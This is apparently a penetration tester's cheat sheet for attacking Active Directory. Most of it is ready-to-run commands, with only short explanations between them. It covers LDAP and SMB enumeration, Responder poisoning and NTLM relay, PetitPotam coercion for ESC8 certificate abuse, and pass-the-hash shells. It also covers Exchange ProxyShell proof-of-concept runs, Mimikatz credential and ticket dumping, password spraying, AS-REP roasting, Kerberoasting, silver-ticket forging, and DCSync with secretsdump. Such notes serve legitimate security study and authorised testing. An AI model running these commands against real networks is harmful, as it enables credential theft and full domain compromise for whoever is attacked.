---
layout: blank
pagetitle: Active Directory Exploitation
---

AD mindmap - [https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

## Notes on tooling
- Impacket has been a bit hit or miss with pip and packages and all
- What's worked has been installing impacket via `python3 -m pipx install impacket`
  - However, tools using `impacket` as a library (like Petitpotam) will fail, since impacket isn't installed as a pip library
  - Thus, create a virtual environment just for pip
    - `python3 -m venv pipenv`, `source pipenv/bin/activate`, and `pip install impacket`
  - Tools like petitpotam will now be able to reference the impacket library within the venv

**Enumeration with PowerShell and .NET Classes**
- LDAP is the communication channel that AD uses to query things
	- If a domain machine searches for a printer, the search query uses LDAP
	- `LDAP://{Hostname}:{port}/{/DN}`
	- LdapDomainDump - outputs to a pretty HTML page
		- `sudo ldapdomaindump ldaps://{IP} -u '{username}' -p '{password}'`
- Checking for anonymous LDAP bind
	- `ldapsearch -x -H ldap://{IP} -b "dc={domain},dc={TLD}"`
	- This can yield a ton of information, such as users on the system
		- `ldapsearch -x -H ldap://{IP} -b "dc={domain},dc={tld}" "(objectClass=person)"`
		- [More info](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
		- Users can have custom fields added, so check each user/group for passwords
			- `| grep -iE "pass|pwd|secret|cred|auth|token|key"`
			- If we find anonymous ldap bind, slowing down for 5-10 mins and just processing the entire output could be nice
	- Checking lockout policy: `ldapsearch -D '{user}@{user_domain}' -w '{user_password}' -p 389 -h {IP} -b "dc={target_domain},dc={tld}" -s sub "*" | grep lockoutThreshold`
- Distinguished names (DNs)
	- Uniquely identifies domain objects
	- `CN={obj_name},CN={container},DC={domain_component1},DC={domain_component1}`
		- `CN=Stephanie,CN=Users,DC=corp,DC=com`



## Manual Enumeration
- `PsLoggedOn.exe` - uses Remote Registry service to enumerate registry keys to see who's logged on to a system
	- Not enabled by default on workstations since Windows 8, but it enabled by default on servers like 2012, 2016, 2019, and 2022
	- Usage: `.\PsLoggedOn.exe \\{computer name}`
	- If we found from `Find-LocalAdminAccess` that we have Admin access to a machine where another user is logged on, we should be able to take their hashes
- Enumerating SMB
	- `smbclient` is great for listing/connecting to smb shares
		-  List smb shares: `smbclient -N -L //{domain}/ -I IP`
		- Connect to smb share: `smbclient -N //{domain}/{share} -I {IP}`
			- With creds: `smbclient //{IP}/{share} -U {username}%{password}`
		- To remove null bytes: `tr -d '\000' < input_file > output_file`
	- With credentials, enumerate all shares with crackmapexec (shown below)
- Enumerating Service Accounts
	- Service accounts are services launched by the system
	- They're assigned a Service Principal Name (SPN) which associates the service to a service account in AD
	- `setspn.exe` is installed by default on Windows
		- `setspn -L iis_service` 
		- `Get-NetUser -SPN` will also list the service users
- Can use `crackmapexec` to enumerate shares/users/groups
	- `crackmapexec smb {IP} -u {username} -p {password} --shares`
	- `nxc smb {IP} -u {username} -p {password} --rid-brute 3000`
	- Anonymous logon would be username `anonymous` and empty password
	- To enumerate everything:
		- `crackmapexec smb {IP} -u {username} -p {password} --all`

## Automatic Enumeration

**Enum4Linux**
- Just run `enum4linux {IP}`



## Poisoning/Relaying/Coercing
- Poisoning is often your best friend on internals
- Run `sudo responder -I {network_interface}` to capture auth information
  - Can try to crack NTLMv2 hash
  - Can also relay it onwards to a server that doesn't have SMB signing
    - If done, make sure to disable responder's SMB and HTTP servers in `/etc/responder/Responder.conf` since they both try to use SMB and HTTP
- If the credentials can't be cracked, pair responder up with `ntlmrelayx`
  - `impacket-ntlmrelayx -t {protocol_like_ldap}://{dc_ip}`
    - `smb` can give different errors and depends on signing
    - `-c "{command}"` will execute a command as the user
- Can check for available coercion methods with `nxc smb {IP} -M coerce_plus -o LISTENER={kali_IP}`
  - This is better with credentials; can check for more methods (`-u {domain}\{user}` and `-p {password}`)
- Petitpotam
  - Uses `EfsRpcOpenFileRaw` to convince the DC to open a file at `\\attacker_share\share`, thus causing the DC to authenticate to us
  - We can capture the credential using impacket's `smbserver` to try and crack it, but this is pretty unlikely to work due to the randomized passwords
    - `smbserver.py loot $(pwd) -smb2support` will host a share on our IP called `loot`
    - Instead, we should relay them on with impacket's `ntlmrelayx` or `certipy`
  - ESC8 relay example:
    - Run `python PetitPotam.py {kali_IP} {vulnerable_DC_IP}` to get the server to authenticate to us
      - Sometimes petitpotam won't work for unauthenticated users, thus `-u {user} -p {password} -d {domain}` can be used
      - PetitPotam won't capture the credentials on its own, thus:
    - Use `ntlmrelayx.py -t http://{target_DC_IP}/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'` to relay the auth to the target
      - Can also use `--template 'DomainController'`


## RPC
- 

## SMB
- `nxc smb {IP} -u {username} -p {password}`
  - Some useful flags:
    - `--shares` for share enumeration, `--rid-brute 3000` or `--users` for user enum, `--pass-pol` for password policy
- 
- `smbclient -L //{ip}/ -N` for anonymous (username of anonymous and no password), or `-U 'domain/username` for credentials
  - `recurse ON` to recursively list files
  - Check inside SYSVOL `policies/{guid}/machine/preferences/groups` for a group policy password
    - If found, decode with `gpp-decrypt`

## Getting execution with credentials or hashes
- Shells:
  - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
  - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
  - 593 - use `atexec.py -hashes :{hash} '{domain}/{user}@{ip}' "{command}"`
  - 3389 - user `xfreerdp /u:{user} /d:{domain} /pth:{hash} /v:{IP}`
    - `/p:{password}` if we have it
  - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
    - `-r` optional, used for kerberos



**Exchange**
- Can run `proxyshell_rce.py -u https://{exchange_endpoint} -e administrator@{domain}` from an unauthed perspective
  - 
- Can run `poc_aug3.py {IP} {username} {password} {command}`
  - PoC: [https://github.com/testanull/ProxyNotShell-PoC](https://github.com/testanull/ProxyNotShell-PoC)

## BloodHound/SharpHound
- Capturing the system data with SharpHound:
	- [SharpHound](https://github.com/SpecterOps/SharpHound/releases/latest)
		- Confirmed version 1.1.1 for kali's default 4.3.1 bloodhound (legacy)
    		- Upon further testing, it seems sharphound 2.6.5 works with bloodhound 4.3.1 (https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1)
		- `Invoke-WebRequest {url} -Outfile {outfile}; Expand-Archive {outfile}`
		- Use with `Import-Module .\SharpHound.ps1`
	- `Invoke-BloodHound -CollectionMethod All -OutputDirectory {dir} -OutputPrefix {filename_prefix}`
	- Look at misc notes for getting the file off of the system
- Can also be run from kali
    - `nxc ldap {dc} -u {username} -p {password} --bloodhound --collection All --dns-server {dns_server_ip}`
	- `apt install bloodhound`
	- `pip install bloodhound`
	- `bloodhound-python -u {user} -p {password} -d {domain} -ns {IP} -c all`
- Analyzing the data with BloodHound
	- Use neo4j on kali machine - `sudo neo4j start`
		- If not installed, just run `neo4j` and install the suggested option
		- Go to localhost:7474 in the browser, set a new password
	- Now we can run `bloodhound`
		- Sign in with new password set
		- Upload the SharpHound zip folder using button on right
	- This will show all data collected AS THE CURRENT USER
		- It will have no idea if other users have local admin access on other workstations, only current user
- Analysis
    - To perform analysis on newer versions of BloodHound CE, click the file browse button next to the Cypher query
	- Queries:
		- All computers: `MATCH (m:Computer) RETURN m`
		- All users: `MATCH (m:User) RETURN m`
		- Active sessions: `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`
		- Get all hostnames (for massive internal networks): `./cypher-shell -u neo4j -p {password} 'MATCH (c:Computer) WHERE toLower(c.name) ENDS WITH ".example.domain.tld" RETURN c.name' --format plain | tee hostnames.txt`
	- Interesting paths:
		1. Paths to high value targets from owner users (or even paths to other users)
		2. Outbound object control of common groups
		3. Find Workstations where Domain Users can RDP
		4. Find Servers where Domain Users can RDP
		5. Find Computers where Domain Users are Local Admin
		6. Shortest Path to Domain Admins from Owned Principals
		7. List Kerberoastable users
		8. User SPNs (what can certain users access)

## Password Attacks

**Cached Credentials**
- Password hashes stored in Local Security Authority Subsystem Service (LSASS)
- Basically just use Mimikatz as before
	- `privilege::debug` gives us the `SeDebugPrivilege` to run below commands
	- `token::elevate` to elevate to SYSTEM user
	- `lsadump::sam` will dump NTLM hashes of local users
	- `sekurlsa::logonpasswords` will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets
	- `sekurlsa::tickets` will show tickets stored in memory
		- We want to steal TGT more than a TGS for overall service access (rather than just one)
- Public Key Infrastructure (PKI)
	- Part of the Active Directory Certificate Service (AD CS), which implements PKI to exchange digital certs between authenticated users and trusted resources
	- Certificate Authority (CA) servers can grant/revoke certificates
		- The private keys used are usually non-exportable, but Mimikatz's `crypto::capi` and `crypto::cng` can take care of that

**Password Spraying**
- Avoiding lockout - `net accounts` will show authentication lockout information
- Using [script enumeration](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1) 
	- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`
- SMB password spraying
	- Use `crackmapexec`
		- `crackmapexec smb {IP_with_smb} -u users.txt -p passwords.txt -d {domain} --continue-on-success`
			- Can also pass single username/password
		- This sprays passwords against a single IP's SMB share
		- This will also show whether the user is an administrator
	- SMB hash spraying
		- `crackmapexec smb {IP} -u {users.txt} -H {hashes.txt}`
	- Crackmapexec can also run comands via SMB:
		- `nxc smb {IP} -u {username} -p {password} -X 'powershell -e ...`
- Obtaining TGTs
	- Use [kerbrute](https://github.com/ropnop/kerbrute/releases/) - `.\kerbrute_windows_amd64.exe passwordspray -d {domain} .\usernames.txt "{password}"`
	- AS-REP Roasting without credentials, described below
- WinRM
	- Indicated by port 5985/5986
	- `evil-winrm -i {IP} -u '{domain}\{domain_user}' -p '{password}'`
	- Also accepts NTLM hashes `evil-winrm -i {IP} -u {user} -H {hash}`
- RPC:
	- Indicated by port 135,593
	- Can get an RPC shell with `rpcclient -U {username} {IP}`
		- `enumdomusers` can get the domain users from within RPC, which we can then check again for preauth
		- `queryuser {username}` to get user properties (passwords could be in descriptions)
			- Can also just `querydispinfo`
	- Could also have a null session (basically allowing anonymous users to connect and query info)
    	- `enum4linux` will check for this
    	- `rpcclient -U "" {IP} -N`

## AS-REP Roasting
- Requires that Kerberos preauth is disabled, which prevents sending an AS-REQ on behalf of any user
- Performing hash cracking after receiving the AS-REP from the KDC
- Performed with `impacket-GetNPUsers` on kali side
	- `impacket-GetNPUsers -dc-ip {dc} -request -outputfile hashes.asreproast {domain}/{username}` (alongside password)
		- With users.txt: `impacket-GetNPUsers {domain}/ -no-pass -usersfile users.txt -dc-ip {IP} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'`
	- Hashes can be cracked with Hashcat's 18200
- Performed with [`Rubeus`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) on Windows side
	- `.\Rubeus.exe asreproast /nowrap`
- This can also be done without a password to find users who don't have Kerberos pre-auth
	- `impacket-GetNPUsers -dc-ip {IP} {domain}/`
	- These users don't require a password to grab the TGT hash
- **CVE-2022-33679 - exploiting RC4 keys**
  - MITM exploit to downgrade a client's encryption to RC4-md4 cypher, then cracking cypher's key
  - Doesn't require authentication, but does require a lack of Kerberos preauth on target account
  - Exploit: https://github.com/Bdenneu/CVE-2022-33679/tree/main
    - `CVE-2022-33679.py {domain}/{user} {target_IP}`

## Kerberoasting
- Cracking the password of the service account by using the encrypted SPN password hash used on the service ticket
- Can use `impacket-GetUserSPNs` if remote with creds
	- `impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {IP} -request`
- Can use `Rubeus` again if local
	- `.\Rubeus.exe kerberoast /outfile:hash.txt`
- Can crack with Hashcat's 13100 mode

## Silver Tickets
- Forging our own service tickets via a password hash that should only be known to the DC and service account
	- This requires that Privileged Account Certificate (PAC) be disabled, which it often is
- To create the ticket, we need:
	- SPN password hash - can use `sekurlsa::logonpasswords` on machine with established session with application (usually(?) current machine)
	- Domain SID - `whoami /user` minus the last number (user RID)
	- Target SPN - basically just the DNS host name and the protocol (like HTTP)
- Performed using `mimikatz`
	- Don't escalate privileges to system
	- `kerberos::golden /sid:{sid} /domain:{domain} /ptt /target:{server_name} /service:{service_protocol_like_http} /rc4:{NTLM_hash} /user:{any_domain_user}`
		- `ptt` allows us to inject forged ticket into memory of target machine
- Then, we should be able to access the service with the following:
	- `iwr -UseDefaultCredentials {protocol}://{server_name}`

## Domain Controller Synchronization
- Sometimes there are multiple DCs across an environment for redundancy
  - These DCs use Directory Replication Service (DRS) to synchronize
  - DCs receiving requests for updates don't check if the request came from a known DC and only verify that the SID has the correct privileges
  	- This means that we just need a user with the correct privileges
  	- *Required privileges*: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes in Filtered Set 
  		- Owned by Domain Admins, Enterprise Admins, and Administrators by default
    - If we have `WriteDACL` on the domain via a group, we can give ourselves the necessary permissions
- Performed with `mimikatz` on domain-joined machine 
	- This gives us a way to get the hash of any domain user
	- `lsadump::dcsync /user:{domain}\{user}` 
- Can also be performed with `impacket-secretsdump` on kali
	- `impacket-secretsdump -just-dc-user {target_domain_user} {domain}/{admin_username}:"{password}"@{DC_IP}`
	- `impacket-secretsdump -hashes :{NTLM_hash} {domain}/{user}@{DC_IP}`

## SCCM
**Recon**
- `sccmhunter.py find -u {username} -p {password} -d {domain} -dc-ip {dc_ip} -debug`
  - Also worth running `nxc smb` on the sccm server: `mxc smb {sccm_ip} -u {username} -p {password} -d {domain} --shares
- `pxethief.py 2 {sccm_ip}` can also yield results
**Exploitation**
- Not much experience here, but refer to [Orange Cyberdefense's mind-map](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
- Based on the credential level access we have, we can perform a number of different attacks

## Miscellaneous
- [Group3r](https://github.com/Group3r/Group3r) is a good tool to auto-enum group policy misconfigs